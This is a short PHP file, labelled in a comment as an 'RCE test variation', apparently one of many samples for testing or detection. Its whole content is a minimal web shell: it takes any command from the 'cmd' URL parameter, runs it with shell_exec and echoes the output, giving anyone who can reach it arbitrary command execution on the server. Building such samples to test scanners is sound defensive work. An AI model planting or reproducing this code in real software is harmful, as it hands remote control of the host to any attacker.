<?php
// RCE test variation #1275
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>